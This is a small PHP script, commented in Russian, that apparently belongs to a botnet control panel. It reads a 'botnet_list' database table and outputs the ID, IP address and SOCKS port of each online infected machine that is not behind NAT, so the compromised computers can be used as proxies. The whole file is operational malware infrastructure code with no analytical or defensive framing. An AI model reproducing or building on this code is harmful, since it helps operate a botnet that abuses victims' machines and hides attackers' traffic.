<?php
/*
  Получение списка соксов, находящихся в онлайне.
  Файл должен быть выложен в корень панели управления.
*/

define('__CP__', 1);
require_once('system/global.php');
if(!@include_once('system/config.php'))die();

HTTPNoCacheHeaders();
HTTPU8PlainHeaders();

if(!ConnectToDB() || !($r = @mysql_query('SELECT bot_id, ipv4, port_s1 FROM botnet_list WHERE flag_nat=0 AND rtime_last>='.(time() - BOTNET_TIMEOUT))))
{
  die('MySQL error: '.mysql_error());
}

while(($m = mysql_fetch_row($r)))
{
  echo "{$m[0]} {$m[1]}:{$m[2]}\r\n";
}
?>